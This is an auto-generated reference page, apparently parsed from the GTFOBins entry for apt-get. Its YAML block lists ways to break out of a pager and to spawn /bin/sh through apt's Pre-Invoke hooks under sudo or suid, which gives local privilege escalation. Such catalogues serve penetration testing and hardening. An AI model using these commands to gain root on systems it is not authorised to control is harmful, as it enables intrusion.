---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# apt-get

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `apt-get` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/apt-get` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [apt-get](../../tools/linux/apt-get.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | apt-get |
| name | apt-get |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/apt-get/ |

## Preserved Source Material

```yaml
_body: ''
_name: apt-get
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/apt-get
functions:
  inherit:
  - code: apt-get changelog apt
    contexts:
      sudo: null
      unprivileged: null
    from: less
  shell:
  - code: 'echo ''Dpkg::Pre-Invoke {"/bin/sh;false"}'' >/path/to/temp-file

      apt-get -y install -c /path/to/temp-file sl'
    comment: For this to work the target package (i.e., `sl`) must not be already installed.
    contexts:
      sudo: null
      suid:
        shell: true
  - code: apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
    comment: When the shell exits the `update` command is actually executed.
    contexts:
      sudo: null
      suid:
        shell: true
```
